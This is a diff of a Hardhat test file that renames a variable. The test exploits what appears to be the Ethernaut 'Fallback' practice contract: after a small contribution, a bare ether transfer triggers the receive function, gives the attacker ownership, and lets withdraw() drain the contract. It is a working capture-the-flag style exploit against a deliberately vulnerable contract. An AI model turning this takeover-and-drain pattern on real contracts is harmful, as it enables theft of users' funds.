@@ -6,42 +6,42 @@ describe("Fallback contract exploit", () => {
   async function deployFallbackFixture() {
     const [deployer, attacker] = await ethers.getSigners();
     const Fallback = await ethers.getContractFactory("Fallback");
-    const level1 = await Fallback.connect(deployer).deploy();
-    return { deployer, attacker, level1 };
+    const fallback = await Fallback.connect(deployer).deploy();
+    return { deployer, attacker, fallback };
   }
 
   it("Should drain the contract", async () => {
-    const { deployer, attacker, level1 } = await loadFixture(deployFallbackFixture);
+    const { deployer, attacker, fallback } = await loadFixture(deployFallbackFixture);
 
     // Add contributions to the contract
-    await level1.connect(deployer).contribute({
+    await fallback.connect(deployer).contribute({
       value: ethers.utils.parseUnits("100", "gwei"),
     });
 
-    await level1.connect(attacker).contribute({
+    await fallback.connect(attacker).contribute({
       value: ethers.utils.parseUnits("1", "gwei"),
     });
 
     // Send ether to contract without specifying msg.data
     // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
     const txReceipt = await attacker.sendTransaction({
-      to: level1.address,
+      to: fallback.address,
       value: ethers.utils.parseUnits("1", "gwei"),
     });
     await txReceipt.wait();
 
     // Check that attacker is the new owner now
-    const newOwner = await level1.owner();
+    const newOwner = await fallback.owner();
     expect(attacker.address).to.equal(newOwner, "Owner did not change");
 
-    const attackerContribution = await level1.connect(attacker).getContribution();
+    const attackerContribution = await fallback.connect(attacker).getContribution();
     const attackerBalanceBeforeAttack = await attacker.getBalance();
 
     // Now attacker is the new owner, hence can withdraw all the ether from the contract
-    await level1.connect(attacker).withdraw();
+    await fallback.connect(attacker).withdraw();
 
     // Assert that contract balance is 0
-    expect(await ethers.provider.getBalance(level1.address)).to.equal("0", "Contract balance is not 0");
+    expect(await ethers.provider.getBalance(fallback.address)).to.equal("0", "Contract balance is not 0");
 
     const attackerBalanceAfterAttack = await attacker.getBalance();
     const increment = attackerBalanceAfterAttack.sub(attackerBalanceBeforeAttack);
